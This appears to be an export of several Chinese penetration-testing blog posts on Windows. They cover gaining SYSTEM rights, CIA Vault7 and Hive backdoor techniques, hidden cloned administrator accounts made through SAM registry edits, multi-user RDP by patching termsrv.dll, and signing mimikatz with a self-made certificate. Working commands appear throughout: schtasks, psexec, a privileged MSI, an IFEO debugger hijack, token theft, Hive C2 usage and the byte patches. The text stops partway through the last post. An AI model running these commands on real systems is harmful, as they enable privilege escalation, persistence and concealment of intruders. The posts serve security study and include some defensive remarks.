    <content type="text"><![CDATA[0x00 前言 在渗透测试中，某些情况下需要用到system权限，例如操作注册表HKEY_LOCAL_MACHINE\SAM\SAM 恰巧最近看到了一篇文章介绍了几种获得system权限的方法，于是决定结合自己的经验对这方面的技巧做系统整理 当然，前提是已经获得系统的管理员权限 学习链接： https://blog.xpnsec.com/becoming-system/ 0x01 简介 本文将要介绍以下内容： 通过创建服务获得System权限的方法 利用MSIExec获得System权限的方法 利用token复制获得System权限的方法 0x02 通过创建服务获得System权限 1、通过sc命令实现sc Create TestService1 binPath= &quot;cmd /c start&quot; type= own type= interact sc start TestService1 该方法在XP系统可以使用 Win7下使用时控制台提示： 警告: 服务 TestService1 被配置为交互式服务，其支持正受到抨击。该服务可能无法正常起作用。 服务启动时弹框，需要点击查看消息才能执行代码，如下图 Win8下控制台提示错误，无法使用该方法 2、通过计划任务使用at命令： at 7:50 notepad.exe 默认以system权限启动，适用于Win7 从Win8开始不再支持at命令 使用schtasks命令： 创建服务，以system权限启动： schtasks /Create /TN TestService2 /SC DAILY /ST 00:36 /TR notepad.exe /RU SYSTEM 查看服务状态： schtasks /Query /TN TestService2 删除服务： schtasks /Delete /TN TestService2 /F 注： 使用schtasks创建服务后记得手动删除 schtasks命令支持Win7-Win10 3、利用psexec使用psexec会创建PSEXESVC服务，产生日志Event 4697、Event 7045、Event 4624和Event 4652 以system权限启动： psexec.exe -accepteula -s -d notepad.exe 默认情况下，system权限的进程不会在用户桌面显示，如果需要显示进程界面，可以加/i参数，命令如下： psexec.exe -accepteula -s -i -d notepad.exe 如下图 4、Meterpreter参考Meterpreter的方法： 创建system权限的服务，提供一个命名管道 创建进程，连接到该命名管道 可供参考的代码： https://github.com/xpn/getsystem-offline 需要getsystem-offline.exe和getsystem_service.exe 测试如下图 注： vs2012直接编译存在bug，可将函数snprintf替换为_snprintf 0x03 利用MSIExec获得System权限 我曾在之前的文章《渗透测试中的msiexec》介绍过利用Advanced Installer制作msi文件的方法，这里不再赘述 本节对XPN提到的方法做复现，使用wix3制作msi文件 wix3下载地址： https://github.com/wixtoolset/wix3 msigen.wix的代码可参考如下地址： https://gist.github.com/xpn/d1ef20dfd266053227d3e992ae84c64e 编译命令如下： candle.exe msigen.wix torch.exe msigen.wixobj 我对XPN的代码做了修改，将payload替换为执行calc.exe，细节上做了部分修改，代码如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;Wix xmlns=&quot;http://schemas.microsoft.com/wix/2006/wi&quot;&gt; &lt;Product Id=&quot;*&quot; UpgradeCode=&quot;12345678-1234-1234-1234-111111111111&quot; Name=&quot;Example Product Name&quot; Version=&quot;0.0.1&quot; Manufacturer=&quot;@_xpn_&quot; Language=&quot;1033&quot;&gt; &lt;Package InstallerVersion=&quot;200&quot; Compressed=&quot;yes&quot; Comments=&quot;Windows Installer Package&quot;/&gt; &lt;Media Id=&quot;1&quot; /&gt; &lt;Directory Id=&quot;TARGETDIR&quot; Name=&quot;SourceDir&quot;&gt; &lt;Directory Id=&quot;ProgramFilesFolder&quot;&gt; &lt;Directory Id=&quot;INSTALLLOCATION&quot; Name=&quot;Example&quot;&gt; &lt;Component Id=&quot;ApplicationFiles&quot; Guid=&quot;12345678-1234-1234-1234-222222222222&quot;&gt; &lt;/Component&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;/Directory&gt; &lt;Feature Id=&quot;DefaultFeature&quot; Level=&quot;1&quot;&gt; &lt;ComponentRef Id=&quot;ApplicationFiles&quot;/&gt; &lt;/Feature&gt; &lt;Property Id=&quot;cmdline&quot;&gt;calc.exe &lt;/Property&gt; &lt;CustomAction Id=&quot;SystemShell&quot; Execute=&quot;deferred&quot; Directory=&quot;TARGETDIR&quot; ExeCommand=&#39;[cmdline]&#39; Return=&quot;ignore&quot; Impersonate=&quot;no&quot;/&gt; &lt;CustomAction Id=&quot;FailInstall&quot; Execute=&quot;deferred&quot; Script=&quot;vbscript&quot; Return=&quot;check&quot;&gt; invalid vbs to fail install &lt;/CustomAction&gt; &lt;InstallExecuteSequence&gt; &lt;Custom Action=&quot;SystemShell&quot; After=&quot;InstallInitialize&quot;&gt;&lt;/Custom&gt; &lt;Custom Action=&quot;FailInstall&quot; Before=&quot;InstallFiles&quot;&gt;&lt;/Custom&gt; &lt;/InstallExecuteSequence&gt; &lt;/Product&gt; &lt;/Wix&gt; 经过我的测试，使用torch.exe将msigen.wixobj编译成msigen.msi文件会报错，如下图 使用light.exe能够成功生成msigen.msi，如下图 虽然报错，但不影响文件的生成和功能的执行 也就是说，完整编译命令如下： candle.exe msigen.wix light.exe msigen.wixobj 直接双击执行msigen.msi会弹框，启动的calc.exe为system权限 命令行下执行： msiexec /q /i msigen.msi 启动的calc.exe为high权限 0x04 利用token复制获得System权限 可参考之前的文章：《渗透技巧——Token窃取与利用》 通过复制system权限的token，使进程获得system权限，常用工具如下： 1、incognitoincognito.exe execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe 下载地址： https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip 2、Invoke-TokenManipulation.ps1Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot; 下载地址： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1 3、SelectMyParentSelectMyParent.exe cmd.exe 504 参考地址： https://github.com/3gstudent/From-System-authority-to-Medium-authority/blob/master/SelectMyParent.cpp Author： Didier Stevens 注： SelectMyParent的原理同xpn开源的代码(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS method)相同，地址如下： https://gist.github.com/xpn/a057a26ec81e736518ee50848b9c2cd6 0x05 小结 本文对常用的System权限获取方法做了整理，最后感谢xpn的博客和他的开源代码。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[CIA Vault7 RDB中的Windows后门利用方法分析]]></title>
    <url>%2Fposts%2F78285c64.html</url>
    <content type="text"><![CDATA[0x00 前言 在上篇文章《CIA Hive测试指南——源代码获取与简要分析》对维基解密公布的代号为Vault 8的文档进行了研究，简要分析服务器远程控制工具Hive 本文将要继续对维基解密公布的CIA相关资料进行分析，介绍Vault 7中Remote Development Branch (RDB)中提到的Windows后门利用方法 资料地址： https://wikileaks.org/ciav7p1/cms/page_2621760.html 0x01 简介 本文将要分析以下后门利用方法： VBR Persistence Image File Execution Options OCI.DLL Service Persistence Shell Extension Persistence Windows FAX DLL Injection 0x02 VBR Persistence 用于在Windows系统的启动过程中执行后门，能够hook内核代码 VBR全称Volume Boot Record (also known as the Partition Boot Record) 对应工具为Stolen Goods 2.0(未公开) Stolen Goods的说明文档地址： https://wikileaks.org/vault7/document/StolenGoods-2_0-UserGuide/ 特点： 能够在Windows启动过程中加载驱动(驱动无需签名) 适用WinXP(x86)、Win7(x86/x64) 该方法取自https://github.com/hzeroo/Carberp 注： https://github.com/hzeroo/Carberp内包含的源码值得深入研究 0x03 Image File Execution Options 通过配置注册表实现执行程序的重定向 修改方式(劫持notepad.exe)： 注册表路径： HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\ 新建项notepad.exe 新建字符串值,名称：notepad.exe，路径&quot;C:\windows\system32\calc.exe&quot; 对应cmd命令为： reg add &quot;hklm\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\calc.exe&quot; /f 启动notepad.exe，实际执行的程序为&quot;C:\windows\system32\calc.exe&quot; 注： 通常情况下，修改该位置的注册表会被杀毒软件拦截 0x04 OCI.DLL Service Persistence 利用MSDTC服务加载dll，实现自启动 Shadow Force曾经在域环境中使用过的一个后门，通过说明文档猜测CIA也发现了该方法可以在非域环境下使用 我在之前的文章介绍过这种利用方法，地址为： https://3gstudent.github.io/Use-msdtc-to-maintain-persistence/ 我的文章使用的方法是将dll保存在C:\Windows\System32\下 CIA使用的方法是将dll保存在C:\Windows\System32\wbem\下 这两个位置都可以，MSDTC服务在启动时会依次查找以上两个位置 0x05 Shell Extension Persistence 通过COM dll劫持explorer.exe的启动过程 该思路我在之前的文章也有过介绍，地址如下： https://3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/ 注： 该方法曾被多个知名的恶意软件使用过，例如COMRAT、ZeroAccess rootkit和BBSRAT 0x06 Windows FAX DLL Injection 通过DLL劫持，劫持Explorer.exe对fxsst.dll的加载 Explorer.exe在启动时会加载c:\Windows\System32\fxsst.dll(服务默认开启，用于传真服务) 将payload.dll保存在c:\Windows\fxsst.dll，能够实现dll劫持，劫持Explorer.exe对fxsst.dll的加载 较早公开的利用方法，参考链接如下： https://room362.com/post/2011/2011-06-27-fxsstdll-persistence-the-evil-fax-machine/ 0x07 小结 本文对Vault7中Remote Development Branch (RDB)中提到的Windows后门利用方法进行了分析，可以看到，这部分内容会借鉴已公开的利用方法 我对已公开的Windows后门利用方法做了一个系统性的搜集(也包括我自己公开的方法)，地址如下： https://github.com/3gstudent/Pentest-and-Development-Tips/blob/master/README.md#tips-30-windows-persistence LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[CIA Hive测试指南——源代码获取与简要分析]]></title>
    <url>%2Fposts%2F77461a5f.html</url>
    <content type="text"><![CDATA[0x00 前言 11月9日维基解密公布一个代号为Vault8的文档，包含服务器远程控制工具Hive的源代码和开发文档。本文仅站在技术角度，介绍测试方法，简要分析工具特点。 维基解密地址： https://wikileaks.org/vault8/ 0x01 简介 本文将要介绍以下内容： 源代码获取方法 框架流程分析 工具具体说明 特点分析 0x02 源代码获取 下载地址： https://wikileaks.org/vault8/document/repo_hive/ 代码库中的文件创建于在2013年8月和2015年10月之间，但工具Hive的开发时间应该更早 维基解密以git的方式公布该代码，包含以下几个分支： armv5 autotools debug dhm makemods master(默认) mt6 polar-0.14.3 polar-1.1.8 polar-1.2.11 polar-1.3.4 solarisbug ubiquiti 下载后发现并不包含相关源代码，需要使用git释放源代码 注： 这种方式能够减小源代码体积(下载文件大小95.5MB，实际文件大小170MB) 1、安装gitkali2默认安装，未安装的Linux系统使用以下安装命令： sudo yum install git Windows系统下载地址： https://git-for-windows.github.io/ 使用如下图 2、常用git命令查看所有分支,当前分支会被星号标示出： git branch 当前分支为master，如下图 查看历史版本： git log 查看git状态，能够列出被修改但还未提交的文件： git status 如下图 切换分支： git checkout -b (branchname) 由于当前操作并未提交，所以恢复删除的文件使用.即可，命令如下： git checkout . 成功释放出master分支下的代码，如下图 补充切换版本的方法： 查看版本号： git reflog 切换版本至polar-1.3.4： git checkout polar-1.3.4 0x03 框架分析 结合框架图对Hive进行分析 原图片来自\hive\infrastructure\documentation\Hive Operating Environment.odp 我在原图片的基础上做了标记，便于分析，如下图 (1) Client相当于木马的被控端，通过hive-patcher生成 支持以下系统： mt-x86 mt-mips mt-mipsel mt-ppc linux-x86 sol-x86 sol-sparc 可使用以下目录的不同版本： hive\snapshot_20141217-1052\clientDirectory hive\snapshot_20141107-1345\clientDirectory hive\snapshot_20141017-1409\clientDirectory 测试使用hive\snapshot_20141107-1345\clientDirectory 用法如下： ./hive-patcher -a address [-d b_delay] [-i interval] (-k idKey | -K idKeyFile) [-I interface] [-p port] [-t t_delay] [-m OS] 该工具的详细说明可参考用户文档，位于\hive\documentation\UsersGuide\UsersGuide.odt, 2.3 (S) Patcher 实例： ./hive-patcher -a 192.168.81.192 -p 4567 -i 3600 -j 5 -m linux-x86 -k &quot;Testing Testing&quot; 生成过程会显示配置信息，如下图 (2) 端口转发VPS Redirector，第一跳板，实现流量转发功能 详细配置可参考： \hive\infrastructure\documentation\Infrastructure Configuration Guide.odt， 6 (S//NF) VPS Redirector (3) 中转服务器Blot Proxy，第二跳板，实现流量分发功能。使用OpenVPN同VPS Redirector进行通信，对Client的证书进行校验，若证书有效，流量转发至Honeycomb服务器，若证书存在问题，流量转发至CoverServer 详细说明可参考： \hive\infrastructure\documentation\Infrastructure Configuration Guide.odt， 5 (S//NF) Blot Proxy 需要安装Blot-4.3 sinnertwin-blot-beastbox-1.3-1 具体功能通过Switchblade实现 Switchblade：通过开源Web服务器Nginx和LinuxIP路由策略实现流量分发 详细配置可参考： \hive\infrastructure\documentation\Switchblade.odt (4) Server控制端，分为CoverServer和Honeycomb CoverServer：提供正常的网页功能，可根据不同端口返回不同的域名信息 详细配置可参考： \hive\infrastructure\documentation\Infrastructure Configuration Guide.odt， 3 (S//NF) Cover Server Honeycomb：实际控制端，该部分的详细配置说明缺失 提供给用户操作的界面程序为Cutthroat Cutthroat：相当于木马控制端，发送控制命令 可使用以下目录的不同版本： hive\snapshot_20141217-1052\clientDirectory hive\snapshot_20141107-1345\clientDirectory hive\snapshot_20141017-1409\clientDirectory 启动方式： ./cutthroat hive 如果控制台回显success，代表加载成功 详细配置可参考： \hive\documentation\UsersGuide\UsersGuide.odt, 3.4 (U) Command and Control Client 使用版本snapshot_20141217-1052\clientDirectory会报错，返回 ./hive: undefined symbol: debug_print_buffer [local failure] Failed to load hive [load] 如下图 换另一个测试版本snapshot_20141107-1345/ctDirectory 返回 [success] Successfully loaded hive [load] 如下图 按下Tab键能够获得可用的命令 通信上分为两种模式： 主动连接： ilm connect &lt;triggerFileName&gt; 用于主动连接服务器上的后门 被动连接： ilm listen &lt;port&gt; 当成功与Client建立连接后，支持如下操作： cmd exec file put file get ilm exit quit shutdown now shell open 0x04 其他工具 1、hiveReset_v1_0.py位于\hive\ilm-client\resetTimer_v1.0\delivery_1Oct2012 用于更新木马客户端 2、Chimay-Red未公开 针对MikroTik MIPS RouterOS 6.x的远程利用工具，能够远程植入Hive 相关说明： https://wikileaks.org/ciav7p1/cms/page_16384604.html 3、Mealybug未公开 针对AVTech Network Video Recorders的远程利用工具，能够远程植入Hive 0x05 综合分析 对于维基解密这次公布的Vault8文档，不包含漏洞利用工具和相关POC Hive作为一款远程控制工具，支持多个操作系统，包括Windows(Server 2003)、Linux(x86/x64)、Solaris(sparc/x86)、MikroTik(MIPS/PowerPC/Intelx86)、Ubiquiti (MIPS)和AVTech NVRs(AVTech ARM) 在隐蔽性上下足了功夫，通过流量分发的方式隐蔽实际的控制服务器地址，使用伪造的卡巴斯基实验室证书进行通信 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows系统的帐户隐藏]]></title>
    <url>%2Fposts%2F5b80fcdc.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《渗透技巧——Windows系统远程桌面的多用户登录》介绍过Windows系统远程桌面的利用技巧，实现了非服务器版本Windows系统的多用户远程登录，而最近我和Evilcg一起研究了通过帐户克隆实现隐藏帐户的利用技巧。如果将二者结合，会有什么利用技巧呢，本文将会一一介绍。 0x01 简介 本文将要介绍以下内容： 帐户隐藏的方法 编写脚本实现思路 结合远程桌面多用户登录的利用思路 0x02 帐户隐藏的方法 该方法在网上已有相关资料，本节只做简单复现 测试系统：·Win7x86 1、对注册表赋予权限默认注册表HKEY_LOCAL_MACHINE\SAM\SAM\只有system权限才能修改 现在需要为其添加管理员权限 右键-权限-选中Administrators，允许完全控制 如下图 重新启动注册表regedit.exe，获得对该键值的修改权限 2、新建特殊帐户net user test$ 123456 /add net localgroup administrators test$ /add 注： 用户名要以$结尾 添加后，该帐户可在一定条件下隐藏，输入net user无法获取，如下图 但是，在控制面板能够发现该帐户 如下图 3、导出注册表在注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names下找到新建的帐户test$ 获取默认类型为0x3ea 将注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\test$导出为1.reg 在注册表下能够找到对应类型名称的注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA 如下图 右键将该键导出为2.reg，保存的文件信息如下图 默认情况下，管理员帐户Administrator对应的注册表键值为HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4 同样，右键将该键导出为3.reg 将注册表项HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA下键F的值替换为HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4下键F的值，即2.reg中键F的值替换成3.reg中键F的值 替换后，如下图 4、命令行删除特殊帐户net user test$ /del 5、导入reg文件regedit /s 1.reg regedit /s 2.reg 隐藏账户制做完成，控制面板不存在帐户test$ 通过net user无法列出该帐户 计算机管理-本地用户和组-用户也无法列出该帐户 但可通过如下方式查看： net user test$ 如下图 无法通过net user test$ /del删除该用户，提示用户不属于此组，如下图 删除方法： 删除注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\下对应帐户的键值(共有两处) 注： 工具HideAdmin能自动实现以上的创建和删除操作 0x03 编写脚本实现思路 采用powershell脚本实现的两种思路： 1、对注册表添加管理员帐户的编辑权限使用regini注册ini文件为注册表及其子键赋予权限 注： Powershell通过Set-Acl为注册表赋予权限，示例代码： $acl = Get-Acl HKLM:SAM\SAM\ $person = [System.Security.Principal.NTAccount]&quot;Administrators&quot; $access = [System.Security.AccessControl.RegistryRights]&quot;FullControl&quot; $inheritance = [System.Security.AccessControl.InheritanceFlags]&quot;None&quot; $propagation = [System.Security.AccessControl.PropagationFlags]&quot;NoPropagateInherit&quot; $type = [System.Security.AccessControl.AccessControlType]&quot;Allow&quot; $rule = New-Object System.Security.AccessControl.RegistryAccessRule( ` $person,$access,$inheritance,$propagation,$type) $acl.ResetAccessRule($rule) Set-Acl HKLM:SAM\SAM\Domains\Account\Users\Names $acl 但不支持对子键的权限分配，因此不采用该方法 以下内容保存为a.ini: HKEY_LOCAL_MACHINE\SAM\SAM\* [1 17] 注： *代表枚举所有子键 1代表Administrators 完全访问 17代表System 完全访问 详细权限说明可通过cmd执行regini获取帮助，如下图 通过regini注册: regini a.ini Evilcg就是通过这种方式实现的，脚本地址： https://github.com/Ridter/Pentest/blob/master/powershell/MyShell/Create-Clone.ps1 注： 使用*需要system权限,但只把相关的列举出来，只需要管理员权限即可，例如： HKEY_LOCAL_MACHINE\SAM [1 17] HKEY_LOCAL_MACHINE\SAM\SAM [1 17] HKEY_LOCAL_MACHINE\SAM\SAM\Domains [1 17] HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account [1 17] HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users [1 17] HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names [1 17] 2、直接获得System权限我在之前的文章《渗透技巧——Token窃取与利用》介绍过通过token复制获得system权限的方法 所以，可以先获得System权限，进而拥有对注册表的编辑权限 简单的方式，通过Invoke-TokenManipulation.ps1，地址如下： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1 但我在测试时发现了一个bug，使用Invoke-TokenManipulation -ImpersonateUser -Username &quot;nt authority\system&quot;无法将当前权限切换为System权限 但可以使用Invoke-TokenManipulation -CreateProcess &quot;cmd.exe&quot; -Username &quot;nt authority\system&quot;新打开一个System权限的进程 接下来，就是编写脚本实现注册表的导出替换功能： 新建测试帐户 将注册表导出到temp目录，进行替换 删除特殊帐户 导入注册表文件 我的实现方法参照了Evilcg的最初始版本，做了细节上的优化，下载地址： https://github.com/3gstudent/Windows-User-Clone 0x04 结合远程桌面多用户登录的利用思路 通过以上的介绍，可得出该方法的优点： 通过克隆的方式能够继承原帐户的权限 在利用上存在以下需要注意的问题： 1、复制管理员帐户Administrator需要注意管理员帐户是否被禁用，如果被禁用，那么克隆出的隐藏帐户也是被禁用状态 2、复制已有帐户在3389远程登录的利用上存在相同帐户的冲突关系 通过cmd开启本机的3389远程登录功能： REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f 利用以上方法，克隆帐户a的权限，建立隐藏帐户aaa$ 如果系统当前登录帐号为a，那么使用隐藏帐户aaa$登录的话，会系统被识别为帐户a，导致帐户a下线 3、新建帐户再复制进一步，大胆的思考 新建管理员帐户b，克隆帐户b，建立隐藏账户bbb$ 删除管理员帐户b，隐藏账户bbb$仍然有效 4、原帐户的维持再进一步 克隆帐户a的权限，建立隐藏帐户aaa$ 修改帐户a的密码，隐藏帐户aaa$仍然有效 0x05 防御 针对隐藏帐户的利用，查看注册表HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\即可 当然，默认管理员权限无法查看，需要分配权限或是提升至Sytem权限 隐藏帐户的登录记录，可通过查看日志获取 0x06 小结 本文介绍了隐藏帐户的相关利用技巧，如果应用于远程桌面的多用户登录，隐蔽性会大大提高，站在防御的角度，分享出该利用方法，帮助大家更好的认识和防御。 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows系统远程桌面的多用户登录]]></title>
    <url>%2Fposts%2F734c18d1.html</url>
    <content type="text"><![CDATA[0x00 前言 在渗透测试中，经常会接触Windows服务器的远程桌面服务，通过界面对服务器进行管理。而对于普通的Windows系统，在某些条件下也需要进行界面操作。 虽然我们可以通过编写程序来实现界面操作（捕获桌面信息，压缩传输，发送鼠标键盘消息等），但是如果能够使用远程桌面服务，岂不是更加方便高效 那么，对应非服务器版本的Windows系统，在使用远程桌面服务有哪些需要注意的问题呢，本文将会逐个分析介绍。 0x01 简介 本文将要介绍如下内容： 开启远程桌面的方法 使用mimikatz支持远程桌面多用户的原理 改进思路 测试工具rdpwrap 0x02 开启远程桌面的方法 1、查询系统是否允许3389远程连接REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections 1表示关闭，0表示开启 查看远程连接的端口： REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber 端口格式为16进制，如下图 0xd3d转换为十进制为33389 2、本机开启3389远程连接的方法方法1：通过cmdREG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f 方法2：通过reg文件内容如下： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server] &quot;fDenyTSConnections&quot;=dword:00000000 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp] &quot;PortNumber&quot;=dword:00000d3d 导入注册表： regedit /s a.reg 注： 如果修改连接端口，系统重启后才能生效 补充 如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口，如下图 修改防火墙配置，允许3389端口的命令如下: netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow 3、远程连接方法kali使用3389远程连接： rdesktop 192.168.1.1:3389 Windows： mstsc.exe 0x03 非服务器版本的Windows系统默认只允许一个账户登录 具体表现为： 远程登录时，使用与原系统相同的账户，原系统将被切换到登录界面 如下图 使用不同的账户，登录时提示其他用户已登录到此计算机，如下图 选择继续后，原系统桌面将弹框提示是否断开当前连接(30秒后默认选择同意，退回到登录界面) 如下图 0x04 非服务器版本的Windows系统支持多用户登录的方法 1、使用mimikatzprivilege::debug ts::multirdp 执行如下图 开启多用户登录功能，最高支持到Win7 使用与原系统相同的账户，原系统还是会被切换到登录界面 使用与原系统不同的账户，登录成功，如下图 通过查看mimikatz的源码找到修改思路，代码位置如下： https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_ts.c Windows在开启服务Remote Desktop Services时，会加载termsrv.dll，如下图 通过修改内存中的termsrv.dll实现开启多用户功能，具体操作如下： Win7 x86： 查找:0x3B86200300000F84 替换为:0xC78620030000FFFFFF7F9090 Win7 x64： 查找:0x39873C0600000F84 替换为:0xC7873C060000FFFFFF7F9090 当然，该方法在系统重启后失效 更近一步，如果我们直接修改文件termsrv.dll，能否实现永久开启多用户登录的功能呢？ 继续接下来的测试 2、修改termsrv.dll推荐工具： CFF Explorer 测试系统： Win7 x64 打开c：\windows\system32下的termsrv.dll Hex Editor 查看十六进制数据39873C0600000F84 如下图 从0x0001738A处开始，选中12字节，替换为C7873C060000FFFFFF7F9090 保存dll 注： 需要先停止远程桌面服务才能替换termsrv.dll 替换termsrv.dll后，重新开启服务TermService 尝试使用不同用户远程连接，成功，验证该思路正确 完整操作如下： 1.查看Remote Desktop Services服务状态 sc qc TermService 2.如果服务启动，需要先关闭 net stop TermService /y 3.删除原termsrv.dll del c:\windows\system32\termsrv.dll 4.替换新termsrv.dll 5.启动服务 net start TermService 6.远程连接 成功实现多用户登录 补充1： Win7 x86： 查找:0x3B86200300000F84 替换为:0xC78620030000FFFFFF7F9090 补充2 常见Windows系统的版本号： 系统 版本号 Win7 6.1.7600 Win7sp1 6.1.7601 Win8 6.2.9200 Win8.1 6.3.9600 3、使用工具rdpwrap工程地址： https://github.com/stascorp/rdpwrap 工具地址： https://github.com/stascorp/rdpwrap/releases 支持Win Vista - Win 10 不修改termsrv.dll，通过传入不同参数实现 安装： RDPWInst.exe -i is 测试如下图 释放rdpwrap.dll和rdpwrap.ini至System32文件夹 rdpwrap.dll会被加载到同termsrv.dll相同的进程 此时，能够使用不同用户进行远程连接 卸载： RDPWInst.exe -u 0x05 小结 本文介绍了三种支持远程桌面多用户登录的方法，适用于不同条件，对于替换termsrv.dll的方法，需要根据系统具体版本，使用不同的替换位置 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[CAT文件数字签名使用技巧]]></title>
    <url>%2Fposts%2Ff3e0db4d.html</url>
    <content type="text"><![CDATA[0x00 前言 Windows系统中的重要文件常常会被添加数字签名，用来防止被篡改，部分白名单规则的判定也会基于数字签名。 本文作为数字签名研究系列文章的基础内容，介绍两种数字签名的添加方法，分析CAT文件数字签名的特点，并且纠正一名读者对我文章的回复，地址如下： 《利用xwizard.exe加载dll》 基于我的测试，个人认为：移动位置后，CAT文件数字签名不会失效 0x01 简介 本文将要介绍以下内容： 生成证书的方法 将数字签名添加在文件末尾的方法(Authenticode) 将数字签名保存在CAT文件中的方法(catalog) 使用CAT数字签名的文件特点 0x02 将数字签名添加在文件末尾的方法(Authenticode) 曾在隐写技巧的系列文章中研究过在数字签名中隐藏payload的方法，地址如下： 《隐写技巧——在PE文件的数字证书中隐藏Payload》 文中介绍过证书格式，在此不再赘述 向文件尾部添加数字签名后，可通过文件属性查看 实例： C:\Windows\System32\consent.exe 自带微软数字签名，如下图 可通过powershell验证数字签名： Get-AuthenticodeSignature .\mimikatz.exe 也可以使用工具通过命令行查看数字签名 使用signtool.exe查看： signtool.exe verify /v C:\Windows\System32\consent.exe 如下图 使用sigcheck.exe查看： sigcheck.exe -q C:\Windows\System32\consent.exe /accepteula 如下图 注： signtool.exe: 可用于查看文件的数字签名 安装Visual Studio后包含SDK，其中可找到signtool.exe，位于C:\Program Files\Microsoft SDKs\Windows\ 进入开发人员工具的cmd可直接调用signtool.exe Windows 7 SDK下载地址： https://www.microsoft.com/en-us/download/details.aspx?id=8279 sigcheck.exe: 可用于查看文件的数字签名 下载地址： https://docs.microsoft.com/zh-cn/sysinternals/downloads/sigcheck 本文相关文件已上传至github，地址如下： https://github.com/3gstudent/signtools 生成测试证书的命令如下： makecert -n &quot;CN=Microsoft Windows Test&quot; -r -sv Root.pvk Root.cer cert2spc Root.cer Root.spc pvk2pfx -pvk Root.pvk -pi 123456 -spc Root.spc -pfx Root.pfx -f 证书注册： (管理员权限) certmgr.exe -add -c Root.cer -s -r localmachine root 注： 细节可参考之前的文章《A dirty way of tricking users to bypass UAC》 签名mimikatz.exe： signtool sign /f Root.pfx /p 123456 mimikatz.exe 显示数字签名正常，如下图 0x03 将数字签名保存在CAT文件中的方法(catalog) Windows系统中，有些文件通过文件属性无法获得其数字签名信息，但是这些文件也包含数字签名，这里的数字签名指的就是CAT(安全编录)文件数字签名(catalog signing) 资料可参考: https://docs.microsoft.com/en-us/windows-hardware/drivers/install/catalog-files 签名流程的直观理解： 将文件作sha1加密后得到的hash值保存在CAT文件中（一个CAT文件可保存多个文件hash） 对该CAT文件添加数字签名 将CAT文件添加到系统的安全编录数据库 这些文件也就有了数字签名 实例： C:\Windows\System32\catroot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntph.cat 属性-安全目录-项目详细信息-File,可以找到Hash值对应的文件 如下图 通过文件属性无法查看CAT数字签名 .cat文件保存格式为ASN.1标准，直接通过记事本无法查看，需要解密，在线网址如下： https://lapo.it/asn1js/ 选择cat文件后即可解密显示完整格式 格式解析可参考： https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography 实例： C:\Windows\System32\xwizard.exe 自带CAT格式的数字签名，通过文件属性无法查看CAT数字签名 使用powershell无法获得CAT文件数字签名： Get-AuthenticodeSignature C:\Windows\System32\xwizard.exe 如下图 注: Win10系统能够获取CAT文件数字签名,Win7不可以 但可以使用signtool.exe和sigcheck.exe查看数字签名 使用signtool.exe查看： signtool.exe verify /pa /a /v C:\Windows\System32\xwizard.exe 如下图 使用sigcheck.exe查看： sigcheck.exe -q C:\Windows\System32\xwizard.exe /accepteula 如下图 下面介绍如何使用CAT文件数字签名 1、生成CAT文件新建文本文档cat.txt，内容如下： [CatalogHeader] Name=makecat1.cat [CatalogFiles] 